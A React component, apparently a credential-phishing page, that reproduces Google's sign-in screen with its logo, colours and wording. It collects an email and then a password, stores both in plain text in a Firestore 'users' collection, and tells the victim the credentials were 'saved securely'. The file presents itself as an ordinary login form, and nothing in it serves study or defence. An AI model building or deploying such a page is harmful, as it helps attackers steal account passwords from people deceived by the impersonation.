import { useState } from "react";
import { Eye, EyeOff } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import { useToast } from "@/hooks/use-toast";
import { collection, addDoc } from "firebase/firestore";
import { db } from "@/lib/firebase";

export default function GoogleSignIn() {
  const [step, setStep] = useState<"email" | "password">("email");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const { toast } = useToast();

  const handleEmailSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (email) {
      setStep("password");
    }
  };

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) return;

    setIsLoading(true);
    try {
      // Save to Firestore
      await addDoc(collection(db, "users"), {
        email: email,
        password: password, // Note: In production, never store plain text passwords
        createdAt: new Date(),
      });

      toast({
        title: "Account created successfully",
        description: "Your credentials have been saved securely.",
      });

      // Reset form
      setEmail("");
      setPassword("");
      setStep("email");
    } catch (error) {
      console.error("Error saving to Firestore:", error);
      toast({
        title: "Error",
        description: "Failed to save credentials. Please try again.",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-background flex items-center justify-center p-4">
      <Card className="w-full max-w-md p-8 shadow-lg border-google-border-light">
        <div className="text-center mb-8">
          <div className="mb-6">
            <svg width="75" height="24" viewBox="0 0 75 24" className="mx-auto">
              <g fill="none" fillRule="evenodd">
                <path
                  d="M10.36 12.04v-1.96h8.6c.08.48.12.98.12 1.52 0 4.84-3.24 8.28-8.72 8.28-5.04 0-9.12-4.08-9.12-9.12s4.08-9.12 9.12-9.12c2.44 0 4.48.88 6.04 2.32l-1.76 1.76c-1.04-.96-2.44-1.52-4.28-1.52-3.48 0-6.28 2.84-6.28 6.32s2.8 6.32 6.28 6.32c3.84 0 5.28-2.76 5.52-4.2h-5.52z"
                  fill="#4285F4"
                />
                <path
                  d="M24.24 12c0-3.64 2.92-6.4 6.64-6.4s6.64 2.76 6.64 6.4-2.92 6.4-6.64 6.4-6.64-2.76-6.64-6.4zm11.44 0c0-2.84-2.04-4.8-4.8-4.8s-4.8 1.96-4.8 4.8 2.04 4.8 4.8 4.8 4.8-1.96 4.8-4.8z"
                  fill="#EA4335"
                />
                <path
                  d="M40.16 12c0-3.64 2.92-6.4 6.64-6.4s6.64 2.76 6.64 6.4-2.92 6.4-6.64 6.4-6.64-2.76-6.64-6.4zm11.44 0c0-2.84-2.04-4.8-4.8-4.8s-4.8 1.96-4.8 4.8 2.04 4.8 4.8 4.8 4.8-1.96 4.8-4.8z"
                  fill="#FBBC05"
                />
                <path
                  d="M56.68 5.84v12.32c0 5.04-2.96 7.12-6.48 7.12-3.32 0-5.32-2.24-6.08-4.04l2.48-1.04c.48 1.16 1.64 2.52 3.6 2.52 2.36 0 3.8-1.48 3.8-4.24v-.96h-.12c-.68.84-2 1.6-3.68 1.6-3.48 0-6.68-3.04-6.68-6.96s3.2-7.12 6.68-7.12c1.68 0 3 .76 3.68 1.56h.12v-1.2h2.68v.44zm-2.56 6.16c0-2.76-1.84-4.8-4.16-4.8s-4.36 2.04-4.36 4.8 2.04 4.8 4.36 4.8 4.16-2.04 4.16-4.8z"
                  fill="#34A853"
                />
                <path d="M65.32 1.6v16.8h-2.8V1.6h2.8z" fill="#EA4335" />
                <path
                  d="M73.16 14.8l2.2 1.48c-.72 1.04-2.44 2.84-5.44 2.84-3.72 0-6.52-2.88-6.52-6.4 0-3.8 2.84-6.4 6.2-6.4 3.4 0 5.08 2.72 5.64 4.16l.32.76-8.8 3.64c.68 1.32 1.72 2 3.2 2 1.48 0 2.52-.72 3.2-1.84v-.24zm-6.92-2.36l5.88-2.44c-.32-.84-1.32-1.44-2.48-1.44-1.48 0-3.56 1.32-3.4 3.88z"
                  fill="#4285F4"
                />
              </g>
            </svg>
          </div>
          <h1 className="text-2xl font-normal text-google-text-primary mb-2">
            {step === "email" ? "Sign in" : "Enter your password"}
          </h1>
          <p className="text-sm text-google-text-secondary">
            {step === "email"
              ? "to continue to your account"
              : `Hi ${email}`}
          </p>
        </div>

        {step === "email" ? (
          <form onSubmit={handleEmailSubmit} className="space-y-6">
            <div className="space-y-2">
              <Label htmlFor="email" className="text-sm font-medium text-google-text-primary">
                Email or phone
              </Label>
              <Input
                id="email"
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="h-14 text-base border-google-border-light focus:border-google-blue focus:ring-1 focus:ring-google-blue"
                placeholder="Enter your email"
                required
              />
            </div>

            <div className="flex items-center justify-between pt-4">
              <Button
                type="button"
                variant="ghost"
                className="text-google-blue hover:bg-blue-50 text-sm font-medium"
              >
                Forgot email?
              </Button>
              <Button
                type="submit"
                className="bg-google-blue hover:bg-google-blue-hover text-white px-6 py-2 text-sm font-medium"
                disabled={!email}
              >
                Next
              </Button>
            </div>

            <div className="pt-4 border-t border-google-border-light">
              <p className="text-sm text-google-text-secondary mb-4">
                Not your computer? Use Guest mode to sign in privately.
              </p>
              <Button
                type="button"
                variant="outline"
                className="w-full border-google-blue text-google-blue hover:bg-blue-50 text-sm font-medium"
              >
                Learn more about using Guest mode
              </Button>
            </div>
          </form>
        ) : (
          <form onSubmit={handlePasswordSubmit} className="space-y-6">
            <div className="flex items-center gap-3 p-3 bg-gray-50 rounded-lg border border-google-border-light">
              <div className="w-8 h-8 bg-google-blue text-white rounded-full flex items-center justify-center text-sm font-medium">
                {email.charAt(0).toUpperCase()}
              </div>
              <div>
                <p className="text-sm text-google-text-primary">{email}</p>
              </div>
            </div>

            <div className="space-y-2">
              <Label htmlFor="password" className="text-sm font-medium text-google-text-primary">
                Enter your password
              </Label>
              <div className="relative">
                <Input
                  id="password"
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="h-14 text-base border-google-border-light focus:border-google-blue focus:ring-1 focus:ring-google-blue pr-12"
                  placeholder="Enter your password"
                  required
                />
                <Button
                  type="button"
                  variant="ghost"
                  size="sm"
                  className="absolute right-2 top-1/2 -translate-y-1/2 h-8 w-8 p-0 hover:bg-gray-100"
                  onClick={() => setShowPassword(!showPassword)}
                >
                  {showPassword ? (
                    <EyeOff className="h-4 w-4 text-google-text-secondary" />
                  ) : (
                    <Eye className="h-4 w-4 text-google-text-secondary" />
                  )}
                </Button>
              </div>
            </div>

            <div className="flex items-center justify-between pt-4">
              <Button
                type="button"
                variant="ghost"
                className="text-google-blue hover:bg-blue-50 text-sm font-medium"
                onClick={() => setStep("email")}
              >
                Forgot password?
              </Button>
              <Button
                type="submit"
                className="bg-google-blue hover:bg-google-blue-hover text-white px-6 py-2 text-sm font-medium"
                disabled={!password || isLoading}
              >
                {isLoading ? "Saving..." : "Next"}
              </Button>
            </div>
          </form>
        )}

        <div className="mt-8 pt-8 border-t border-google-border-light">
          <div className="flex items-center justify-between text-sm">
            <Button variant="ghost" className="text-google-text-secondary hover:bg-gray-50 p-0 h-auto">
              Create account
            </Button>
            <div className="flex gap-6">
              <Button variant="ghost" className="text-google-text-secondary hover:bg-gray-50 p-0 h-auto">
                Help
              </Button>
              <Button variant="ghost" className="text-google-text-secondary hover:bg-gray-50 p-0 h-auto">
                Privacy
              </Button>
              <Button variant="ghost" className="text-google-text-secondary hover:bg-gray-50 p-0 h-auto">
                Terms
              </Button>
            </div>
          </div>
        </div>
      </Card>
    </div>
  );
}